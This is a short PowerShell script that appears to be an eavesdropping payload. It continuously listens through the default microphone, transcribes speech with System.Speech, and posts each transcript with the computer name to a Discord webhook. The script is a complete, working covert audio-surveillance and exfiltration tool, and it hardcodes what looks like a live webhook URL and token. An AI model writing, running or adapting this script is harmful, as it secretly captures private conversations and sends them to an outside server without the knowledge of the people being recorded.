<#=============================== Speech to Discord ====================================

SYNOPSIS
Uses assembly 'System.Speech' to take audio input and convert to text and then send the text to discord.

SETUP
1. Replace 'YOUR_WEBHOOK_HERE' with your discord webhook

#>

Add-Type -AssemblyName System.Speech
$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
$grammar = New-Object System.Speech.Recognition.DictationGrammar
$speech.LoadGrammar($grammar)
$speech.SetInputToDefaultAudioDevice()

while ($true) {
    $result = $speech.Recognize()
    if ($result) {
        $results = $result.Text
        Write-Output $results
        $dc = 'https://discord.com/api/webhooks/1176132406642757662/xCdVqng2X6cErTeiXkd8SO8tiu7oPJ9mOAUdDO9kcCHbM4xZGL6HUopf_adRv7DLeQQE'
        $Body = @{'username' = $env:COMPUTERNAME ; 'content' = $results}
        irm -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
    }
}
